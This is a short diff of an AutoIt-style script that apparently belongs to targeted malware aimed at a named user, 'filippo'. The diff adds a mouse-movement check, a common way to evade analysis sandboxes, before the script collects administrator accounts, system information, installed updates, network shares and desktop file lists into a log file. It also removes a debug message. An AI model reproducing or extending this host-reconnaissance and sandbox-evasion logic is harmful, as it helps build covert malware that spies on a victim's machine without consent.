@@ -6,21 +6,25 @@
 
 $victim = "filippo"
 
-MessageBox("Debug","Start!")
-
 if AmIusername($victim) Then
 
    if InternetCheck() Then
 
-	  Log2File(administrators())
+	  if DetectMouseMoving() Then
 
-	  Log2File(systeminfo())
+		 MessageBox("Debug","Hi!")
 
-	  Log2File(updates_installed())
+		 Log2File(administrators())
 
-	  Log2File(shared())
+		 Log2File(systeminfo())
 
-	  Log2File(ListDesktopFiles())
+		 Log2File(updates_installed())
+
+		 Log2File(shared())
+
+		 Log2File(ListDesktopFiles())
+
+	  EndIf
 
    EndIf
 
